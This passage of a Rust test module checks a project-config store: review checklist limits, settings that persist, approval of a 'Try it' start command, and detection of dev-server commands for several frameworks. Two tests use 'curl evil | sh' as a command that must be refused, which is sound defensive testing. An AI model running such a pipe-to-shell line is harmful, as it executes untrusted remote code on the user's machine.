        let omitted: Vec<ReviewChecklistClass> = serde_json::from_str(r#"[{"name":"Bare"}]"#).unwrap();
        assert!(validate_review_checklist(&omitted).is_err());
        let trimmed = validate_review_checklist(&[class("  Branch   discovery ", " Names\nthe remote. ")]).unwrap();
        assert_eq!(trimmed[0], class("Branch discovery", "Names the remote."));
    }

    /// `set_review` changes only what it is given, refuses an over-limit
    /// list without writing, and refuses a save made on a list that changed
    /// since the editor read it (GH #111 F8).
    #[test]
    fn set_review_is_validated_and_refuses_a_stale_list() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        store.set("ws", default_atelier_config()).unwrap();
        let review = set_review(&store, "ws", Some(false), None, None).unwrap();
        assert!(!review.self_check && store.get("ws").unwrap().target_branch == "main");
        let one = vec![class("Branch discovery", "Names the remote.")];
        let review = set_review(&store, "ws", None, Some(one.clone()), Some(vec![])).unwrap();
        assert!(!review.self_check, "the switch is left as it was");
        assert_eq!(review.review_checklist, one);
        let thirteen: Vec<_> = (0..13).map(|i| class(&format!("C{i}"), "Look.")).collect();
        assert!(set_review(&store, "ws", None, Some(thirteen), None).is_err());
        assert_eq!(store.review("ws").review_checklist, one, "nothing written");
        // A Sync removed the class the editor started from: refused.
        let err = set_review(&store, "ws", None, Some(vec![]), Some(vec![class("Gone", "x")])).unwrap_err();
        assert!(err.contains("changed meanwhile"), "{err}");
        assert_eq!(store.review("ws").review_checklist, one);
    }

    /// GH #111 F23: a stored list over the limits (a hand-edited file) is
    /// repaired a step at a time: any save that makes it less invalid is
    /// taken, one that does not is refused.
    #[test]
    fn an_invalid_stored_list_is_repaired_step_by_step() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let mut cfg = default_atelier_config();
        cfg.review_checklist = (0..14).map(|i| class(&format!("C{i}"), "Look.")).collect();
        cfg.review_checklist[0].sentence = "x".repeat(400);
        cfg.review_checklist[1].sentence = "x".repeat(400);
        store.set("ws", cfg.clone()).unwrap();
        assert_eq!(checklist_invalidity(&cfg.review_checklist), 4);
        let mut list = cfg.review_checklist.clone();
        list.pop();
        let review = set_review(&store, "ws", None, Some(list.clone()), Some(cfg.review_checklist.clone())).unwrap();
        assert_eq!(review.review_checklist.len(), 13, "one removal, still over: taken");
        list[0].sentence = "Short.".into();
        let review = set_review(&store, "ws", None, Some(list.clone()), None).unwrap();
        assert_eq!(checklist_invalidity(&review.review_checklist), 2);
        let mut worse = list.clone();
        worse.push(class("More", "Look."));
        assert!(set_review(&store, "ws", None, Some(worse), None).is_err());
        list[1].sentence = "Short.".into();
        list.pop();
        let review = set_review(&store, "ws", None, Some(list), None).unwrap();
        assert_eq!(checklist_invalidity(&review.review_checklist), 0);
    }

    /// GH #111 F7: without a project config the review settings still save
    /// (in `review.json`), and the first config written takes them over.
    #[test]
    fn review_settings_live_without_a_config_until_one_is_written() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        assert_eq!(store.review("ws"), ReviewSettings::default());
        let one = vec![class("Branch discovery", "Names the remote.")];
        set_review(&store, "ws", Some(false), Some(one.clone()), Some(vec![])).unwrap();
        assert!(store.get("ws").is_none(), "no config is made");
        assert_eq!(store.review("ws"), ReviewSettings { self_check: false, review_checklist: one.clone(), ..ReviewSettings::default() });
        store.set_keeping_review("ws", default_atelier_config()).unwrap();
        let cfg = store.get("ws").unwrap();
        assert!(!cfg.self_check && cfg.review_checklist == one);
        assert!(!tmp.path().join("projects/ws/review.json").exists());
    }

    /// GH #111 F29: Re-detect, the proposal editor and a template write a
    /// whole config; the review settings stay as they were.
    #[test]
    fn a_whole_config_write_keeps_the_review_settings() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        store.set("ws", default_atelier_config()).unwrap();
        let one = vec![class("Branch discovery", "Names the remote.")];
        set_review(&store, "ws", Some(false), Some(one.clone()), None).unwrap();
        let mut detected = default_atelier_config();
        detected.target_branch = "staging".into();
        assert!(detected.self_check && detected.review_checklist.is_empty());
        store.set_keeping_review("ws", detected).unwrap();
        let cfg = store.get("ws").unwrap();
        assert_eq!(cfg.target_branch, "staging");
        assert!(!cfg.self_check && cfg.review_checklist == one);
        store.apply_template("ws", "rust-crate").unwrap();
        let cfg = store.get("ws").unwrap();
        assert!(!cfg.self_check && cfg.review_checklist == one);
    }

    /// GH #111 F31: review settings saved before any config survive the
    /// startup bootstrap of an Atelier-shaped workspace.
    #[test]
    fn bootstrap_keeps_review_settings_saved_without_a_config() {
        let tmp = tempdir().unwrap();
        let project = tempdir().unwrap();
        fs::write(project.path().join("package.json"), "{}").unwrap();
        fs::create_dir_all(project.path().join("src-tauri")).unwrap();
        fs::create_dir_all(project.path().join("scripts")).unwrap();
        fs::write(project.path().join("scripts/install-local.sh"), "#!/bin/bash\n").unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let one = vec![class("Branch discovery", "Names the remote.")];
        set_review(&store, "ws-atelier", Some(false), Some(one.clone()), None).unwrap();
        store.bootstrap_atelier_workspaces(&[("ws-atelier".to_string(), project.path().to_path_buf())]);
        let cfg = store.get("ws-atelier").unwrap();
        assert_eq!(cfg.version_files.len(), 3, "bootstrapped");
        assert!(!cfg.self_check && cfg.review_checklist == one);
    }

    // ── Try it: the start command (TRY_IT_SPEC §4.3, §5) ───────────────

    /// A `config.json` as v1.166 writes it, byte for byte
    /// (`serde_json::to_vec_pretty`), before Try it existed.
    const PRE_TRY_IT_CONFIG: &str = r#"{
  "schemaVersion": 2,
  "targetBranch": "main",
  "versionFiles": [
    {
      "path": "package.json",
      "kind": "package_json"
    }
  ],
  "installScript": null,
  "verifyPipeline": [
    {
      "kind": "script",
      "path": "scripts/ppvp.sh"
    }
  ],
  "cachePaths": [
    "website/.astro"
  ],
  "sharedBuildCache": true,
  "selfCheck": true,
  "createdAt": 1760000000000,
  "updatedAt": 1760000000001
}"#;

    /// Tier 2: a pre-Try-it config loads with no start command and an
    /// untouched save writes it back byte for byte; the new field round-trips;
    /// a value of the wrong type reads as unset without losing the file.
    #[test]
    fn pre_try_it_config_loads_without_a_start_command() {
        let parsed: ProjectConfig = serde_json::from_str(PRE_TRY_IT_CONFIG).unwrap();
        assert_eq!(parsed.try_command, None);
        assert_eq!(parsed.target_branch, "main");
        assert_eq!(parsed.cache_paths, vec!["website/.astro".to_string()]);
        let again = serde_json::to_vec_pretty(&parsed).unwrap();
        assert_eq!(
            String::from_utf8(again).unwrap(),
            PRE_TRY_IT_CONFIG,
            "an untouched config is written as it was"
        );

        // Through the store too: it loads, and the file keeps no new key.
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let dir = store.workspace_dir("ws");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join(CONFIG_FILENAME), PRE_TRY_IT_CONFIG).unwrap();
        let loaded = store.get("ws").unwrap();
        assert_eq!(loaded.try_command, None);
        store.set("ws", loaded.clone()).unwrap();
        let text = fs::read_to_string(dir.join(CONFIG_FILENAME)).unwrap();
        assert!(!text.contains("tryCommand"), "{text}");
        assert!(!dir.join("config.json.tmp").exists(), "written through a temp file, then renamed");

        // The new field round-trips, on disk and through a fresh store.
        let mut with = loaded;
        with.try_command = Some("npm run dev".into());
        store.set("ws", with).unwrap();
        let text = fs::read_to_string(dir.join(CONFIG_FILENAME)).unwrap();
        assert!(text.contains("\"tryCommand\": \"npm run dev\""), "{text}");
        let fresh = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        assert_eq!(fresh.get("ws").unwrap().try_command.as_deref(), Some("npm run dev"));

        // Bad types read as unset; the rest of the file still loads.
        for bad in ["5", "true", "[\"npm\", \"run\", \"dev\"]", "{\"cmd\": \"x\"}", "null"] {
            let text = PRE_TRY_IT_CONFIG.replace(
                "\"installScript\": null,",
                &format!("\"installScript\": null,\n  \"tryCommand\": {bad},"),
            );
            let cfg: ProjectConfig = serde_json::from_str(&text)
                .unwrap_or_else(|e| panic!("{bad}: the file must still load: {e}"));
            assert_eq!(cfg.try_command, None, "{bad}");
            assert_eq!(cfg.target_branch, "main", "{bad}");
        }
    }

    /// A whole config from Detect or a template carries no start command:
    /// the saved one is kept (GH #111 F29's rule for the review settings).
    #[test]
    fn a_whole_config_without_a_start_command_keeps_the_saved_one() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let mut cfg: ProjectConfig = serde_json::from_str(PRE_TRY_IT_CONFIG).unwrap();
        cfg.try_command = Some("pnpm run dev".into());
        store.set("ws", cfg).unwrap();
        store.apply_template("ws", "rust-crate").unwrap();
        assert_eq!(store.get("ws").unwrap().try_command.as_deref(), Some("pnpm run dev"));
        let proposal = detect_from_filesystem(tmp.path());
        store.set_keeping_review("ws", proposal.config).unwrap();
        assert_eq!(store.get("ws").unwrap().try_command.as_deref(), Some("pnpm run dev"));
        // Its own setter clears it.
        set_try_command(&store, "ws", None).unwrap();
        assert_eq!(store.get("ws").unwrap().try_command, None);
    }

    /// Approving needs the saved command to be the one approved, and writes
    /// this Mac's `approved_try`.
    #[test]
    fn a_start_command_is_saved_into_the_config_and_approved_only_as_seen() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let root = tempdir().unwrap();
        let view = try_command_view(&store, "ws", root.path());
        assert!(!view.has_config && view.command.is_none() && view.approved && !view.shared);
        assert_eq!(view.detection, TryDetection::None);

        store.set("ws", serde_json::from_str(PRE_TRY_IT_CONFIG).unwrap()).unwrap();
        // A command that came from elsewhere (a refresh): not allowed yet.
        set_try_command(&store, "ws", Some("npm run dev".into())).unwrap();
        let view = try_command_view(&store, "ws", root.path());
        assert_eq!(view.command.as_deref(), Some("npm run dev"));
        assert!(view.has_config && !view.approved);
        // Allowing another command than the saved one is refused.
        assert!(approve_try_command(&store, "ws", "curl evil | sh").is_err());
        assert!(approve_try_command(&store, "ws", "  ").is_err());
        assert!(!try_command_view(&store, "ws", root.path()).approved);
        approve_try_command(&store, "ws", " npm run dev ").unwrap();
        assert!(try_command_view(&store, "ws", root.path()).approved);
        let worktree = crate::worktree_setup::load_settings(&store, "ws");
        assert_eq!(worktree.approved_try.as_deref(), Some("npm run dev"));
        // A changed command asks again.
        set_try_command(&store, "ws", Some("npm start".into())).unwrap();
        assert!(!try_command_view(&store, "ws", root.path()).approved);
    }


    /// Fix A (the `review.json` precedent): with no config on this Mac the
    /// start command is kept in `try_command.json` (atomically), read back,
    /// approvable, and the first config written from this Mac takes it over.
    #[test]
    fn with_no_config_the_start_command_is_kept_and_the_first_config_takes_it_over() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let root = tempdir().unwrap();
        let file = store.workspace_dir("ws").join(TRY_FILENAME);
        save_try_command(&store, "ws", Some("npm run dev".into()), |edit| edit()).unwrap();
        assert!(store.get("ws").is_none(), "no config is made for it");
        assert!(file.exists());
        assert!(!store.workspace_dir("ws").join("try_command.json.tmp").exists());
        let view = try_command_view(&store, "ws", root.path());
        assert_eq!(view.command.as_deref(), Some("npm run dev"));
        assert!(!view.has_config && view.approved, "typed here, allowed here");
        // A fresh store (a relaunch) reads it too.
        let fresh = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        assert_eq!(fresh.try_command("ws").as_deref(), Some("npm run dev"));

        // The first config, from Detect, takes it over; the file goes.
        store.set_keeping_review("ws", detect_from_filesystem(root.path()).config).unwrap();
        assert_eq!(store.get("ws").unwrap().try_command.as_deref(), Some("npm run dev"));
        assert!(!file.exists());
        assert!(try_command_view(&store, "ws", root.path()).approved);

        // A template as the first config takes it over as well.
        let other = "ws-2";
        set_try_command(&store, other, Some("bin/dev".into())).unwrap();
        store.apply_template(other, "astro-vite").unwrap();
        assert_eq!(store.get(other).unwrap().try_command.as_deref(), Some("bin/dev"));

        // Cleared before any config: the file goes and nothing is left.
        let third = "ws-3";
        set_try_command(&store, third, Some("bin/dev".into())).unwrap();
        set_try_command(&store, third, None).unwrap();
        assert!(!store.workspace_dir(third).join(TRY_FILENAME).exists());
        assert_eq!(store.try_command(third), None);
        set_try_command(&store, third, None).unwrap();

        // An unreadable or odd file reads as none.
        let fourth = "ws-4";
        fs::create_dir_all(store.workspace_dir(fourth)).unwrap();
        for odd in ["not json", r#"{"tryCommand": 5}"#, r#"{"tryCommand": "  "}"#, "[]"] {
            fs::write(store.workspace_dir(fourth).join(TRY_FILENAME), odd).unwrap();
            assert_eq!(store.try_command(fourth), None, "{odd}");
        }
    }

    /// GH #111 F29's rule, for the start command: an explicit `tryCommand:
    /// null` in a whole config (the proposal editor's shape) keeps the saved one.
    #[test]
    fn set_keeping_review_with_an_explicit_null_keeps_the_start_command() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let mut cfg: ProjectConfig = serde_json::from_str(PRE_TRY_IT_CONFIG).unwrap();
        cfg.try_command = Some("yarn start".into());
        store.set("ws", cfg).unwrap();
        let explicit_null = PRE_TRY_IT_CONFIG.replace(
            "\"installScript\": null,",
            "\"installScript\": null,\n  \"tryCommand\": null,",
        );
        let incoming: ProjectConfig = serde_json::from_str(&explicit_null).unwrap();
        assert_eq!(incoming.try_command, None);
        store.set_keeping_review("ws", incoming).unwrap();
        assert_eq!(store.get("ws").unwrap().try_command.as_deref(), Some("yarn start"));
    }

    /// A save the shared channel refuses (a read-only repository) changes no
    /// approval; one it takes approves exactly what was saved.
    #[test]
    fn a_refused_start_command_save_never_approves_it() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        store.set("ws", serde_json::from_str(PRE_TRY_IT_CONFIG).unwrap()).unwrap();
        let refused = save_try_command(&store, "ws", Some("curl evil | sh".into()), |edit| {
            edit()?;
            // `edit_shared` puts the repository's value back, then refuses.
            set_try_command(&store, "ws", None)?;
            Err(crate::workspace_definition::read_only_error("The Start command"))
        });
        assert!(refused.unwrap_err().contains("ask for write access"));
        assert_eq!(crate::worktree_setup::load_settings(&store, "ws").approved_try, None);
        assert_eq!(store.try_command("ws"), None);
        save_try_command(&store, "ws", Some("npm run dev".into()), |edit| edit()).unwrap();
        assert_eq!(
            crate::worktree_setup::load_settings(&store, "ws").approved_try.as_deref(),
            Some("npm run dev")
        );
        // Clearing it clears the approval too.
        save_try_command(&store, "ws", None, |edit| edit()).unwrap();
        assert_eq!(crate::worktree_setup::load_settings(&store, "ws").approved_try, None);
    }

    #[test]
    fn a_start_command_is_one_trimmed_line() {
        assert_eq!(normalize_try_command(None), Ok(None));
        assert_eq!(normalize_try_command(Some("   ".into())), Ok(None));
        assert_eq!(
            normalize_try_command(Some("  npm run dev \n".into())),
            Ok(Some("npm run dev".into()))
        );
        assert!(normalize_try_command(Some("npm ci\nnpm run dev".into())).is_err());
        assert!(normalize_try_command(Some("x".repeat(MAX_TRY_COMMAND_CHARS + 1))).is_err());
    }

    // Tier 3: detection on temp dirs, one row of the §4.3 table each.

    fn project(files: &[(&str, &str)]) -> tempfile::TempDir {
        let dir = tempdir().unwrap();
        for (path, body) in files {
            let at = dir.path().join(path);
            if let Some(parent) = at.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::write(at, body).unwrap();
        }
        dir
    }

    fn script(dir: &tempfile::TempDir) -> (String, String, PackageManager) {
        match detect_try_command(dir.path()) {
            TryDetection::PackageScript { command, script, package_manager } => {
                (command, script, package_manager)
            }
            other => panic!("expected a package script, got {other:?}"),
        }
    }

    const ALL_THREE: &str = r#"{"scripts":{"preview":"vite preview","start":"node server.js","dev":"vite"}}"#;

    #[test]
    fn try_detection_prefers_dev_then_start_then_preview() {
        let dir = project(&[("package.json", ALL_THREE)]);
        assert_eq!(script(&dir), ("npm run dev".into(), "dev".into(), PackageManager::Npm));
        let dir = project(&[("package.json", r#"{"scripts":{"preview":"vite preview","start":"node ."}}"#)]);
        assert_eq!(script(&dir), ("npm start".into(), "start".into(), PackageManager::Npm));
        let dir = project(&[("package.json", r#"{"scripts":{"preview":"vite preview","build":"vite build"}}"#)]);
        assert_eq!(script(&dir), ("npm run preview".into(), "preview".into(), PackageManager::Npm));
        // An empty or non-string script is not one.
        let dir = project(&[("package.json", r#"{"scripts":{"dev":"  ","start":7,"preview":"vite preview"}}"#)]);
        assert_eq!(script(&dir).1, "preview");
    }

    #[test]
    fn try_detection_reads_the_package_manager_from_the_lockfile() {
        for (lock, pm, dev, start) in [
            ("pnpm-lock.yaml", PackageManager::Pnpm, "pnpm run dev", "pnpm start"),
            ("yarn.lock", PackageManager::Yarn, "yarn run dev", "yarn start"),
            ("bun.lockb", PackageManager::Bun, "bun run dev", "bun start"),
            ("bun.lock", PackageManager::Bun, "bun run dev", "bun start"),
            ("package-lock.json", PackageManager::Npm, "npm run dev", "npm start"),
        ] {
            let dir = project(&[("package.json", ALL_THREE), (lock, "")]);
            assert_eq!(script(&dir), (dev.to_string(), "dev".to_string(), pm), "{lock}");
            let dir = project(&[("package.json", r#"{"scripts":{"start":"node ."}}"#), (lock, "")]);
            assert_eq!(script(&dir).0, start, "{lock}");
        }
        // pnpm wins over a stray yarn.lock beside it.
        let dir = project(&[("package.json", ALL_THREE), ("pnpm-lock.yaml", ""), ("yarn.lock", "")]);
        assert_eq!(script(&dir).2, PackageManager::Pnpm);
    }

    #[test]
    fn try_detection_finds_django() {
        let dir = project(&[("manage.py", "#!/usr/bin/env python\n")]);
        let found = detect_try_command(dir.path());
        // The platform the backend is built for decides the Python's name.
        let expected = if cfg!(windows) {
            "py manage.py runserver"
        } else {
            "python3 manage.py runserver"
        };
        assert_eq!(found, TryDetection::Django { command: expected.into() });
        assert_eq!(found.command(), Some(expected));
    }

    #[test]
    fn try_detection_finds_rails_with_config_ru_or_bin_rails() {
        let rails = TryDetection::Rails { command: "ruby bin/rails server".into() };
        let rack = TryDetection::Rails { command: "bundle exec rackup".into() };
        // Gemfile + config.ru without bin/rails: a Rack app.
        let dir = project(&[("Gemfile", "source 'https://rubygems.org'\n"), ("config.ru", "run App\n")]);
        assert_eq!(detect_try_command(dir.path()), rack);
        let dir = project(&[("Gemfile", ""), ("bin/rails", "#!/usr/bin/env ruby\n")]);
        assert_eq!(detect_try_command(dir.path()), rails);
        // A Rails app has both: bin/rails wins.
        let dir = project(&[("Gemfile", ""), ("config.ru", ""), ("bin/rails", "")]);
        assert_eq!(detect_try_command(dir.path()), rails);
        // A Gemfile alone is a Ruby library, not an app.
        let dir = project(&[("Gemfile", "")]);
        assert_eq!(detect_try_command(dir.path()), TryDetection::None);
    }

    #[test]
    fn try_detection_finds_a_static_site_only_without_package_json() {
        let dir = project(&[("index.html", "<!doctype html>")]);
        let found = detect_try_command(dir.path());
        assert_eq!(found, TryDetection::StaticSite { file: "index.html".into() });
        assert_eq!(found.command(), None);
        // With a package.json beside it (no start script), it is not static.
        let dir = project(&[("index.html", "<!doctype html>"), ("package.json", r#"{"name":"x"}"#)]);
        assert_eq!(detect_try_command(dir.path()), TryDetection::None);
        // An index.html deeper down is not the site's front page.
        let dir = project(&[("docs/index.html", "<!doctype html>")]);
        assert_eq!(detect_try_command(dir.path()), TryDetection::None);
    }

    #[test]
    fn try_detection_finds_nothing_and_never_panics_on_odd_files() {
        assert_eq!(detect_try_command(tempdir().unwrap().path()), TryDetection::None);
        assert_eq!(detect_try_command(Path::new("/nonexistent/plyloft-try")), TryDetection::None);
        let dir = project(&[("Cargo.toml", "[package]\nname = \"x\"\n")]);
        assert_eq!(detect_try_command(dir.path()), TryDetection::None);
        for odd in [
            "not json",
            "",
            "{",
            "[]",
            "null",
            r#"{"scripts":"dev"}"#,
            r#"{"scripts":["dev"]}"#,
            r#"{"scripts":null}"#,
            "\u{feff}",
        ] {
            let dir = project(&[("package.json", odd)]);
            assert_eq!(detect_try_command(dir.path()), TryDetection::None, "{odd:?}");
        }
        // A package.json that is a folder, or not valid UTF-8.
        let dir = tempdir().unwrap();
        fs::create_dir_all(dir.path().join("package.json")).unwrap();
        assert_eq!(detect_try_command(dir.path()), TryDetection::None);
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("package.json"), [0xff, 0xfe, 0x00, 0x7b]).unwrap();
        assert_eq!(detect_try_command(dir.path()), TryDetection::None);
        // A byte-order mark (some Windows editors write one) is not a reason to miss it.
        let dir = project(&[("package.json", "\u{feff}{\"scripts\":{\"dev\":\"vite\"}}")]);
        assert_eq!(script(&dir).0, "npm run dev");
        // A malformed package.json beside manage.py still finds Django.
        let dir = project(&[("package.json", "{"), ("manage.py", "")]);
        assert!(matches!(detect_try_command(dir.path()), TryDetection::Django { .. }));
    }

    /// The sheet's words are built from the detection's JSON.
    #[test]
    fn try_detection_serialises_for_the_sheet() {
        let dir = project(&[("package.json", ALL_THREE), ("yarn.lock", "")]);
        assert_eq!(
            serde_json::to_value(detect_try_command(dir.path())).unwrap(),
            serde_json::json!({
                "kind": "packageScript",
                "command": "yarn run dev",
                "script": "dev",
                "packageManager": "yarn"
            })
        );
        assert_eq!(serde_json::to_value(TryDetection::None).unwrap(), serde_json::json!({ "kind": "none" }));
        assert_eq!(
            serde_json::to_value(TryDetection::StaticSite { file: "index.html".into() }).unwrap(),
            serde_json::json!({ "kind": "staticSite", "file": "index.html" })
        );
    }
}
